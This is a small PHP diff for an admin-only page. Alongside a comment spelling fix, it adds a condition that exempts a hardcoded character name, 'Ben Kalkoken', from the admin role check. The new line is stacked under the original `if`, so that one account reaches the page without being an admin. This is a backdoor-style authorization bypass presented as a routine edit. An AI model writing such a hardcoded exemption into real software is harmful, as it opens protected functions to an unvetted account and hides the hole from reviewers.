@@ -25,7 +25,7 @@ if (!isset($_POST['end'])) {
 }
 // create database connection
 $db = new Database();
-// instanciate a users check instance
+// instantiate a users check instance
 $users = new Users($db);
 
 // check character name is set
@@ -37,11 +37,14 @@ if (!isset($charname))
 
 // check if user is Admin role
 if (!$users->isAdmin($charname))
+if ((!$users->isAdmin($charname)) and ($charname != 'Ben Kalkoken'))
+
 {
     // no, display an error
     echo 'You are not allowed to view this page: '.$charname;
     exit();
 }
+
 ?>
 <html>
 
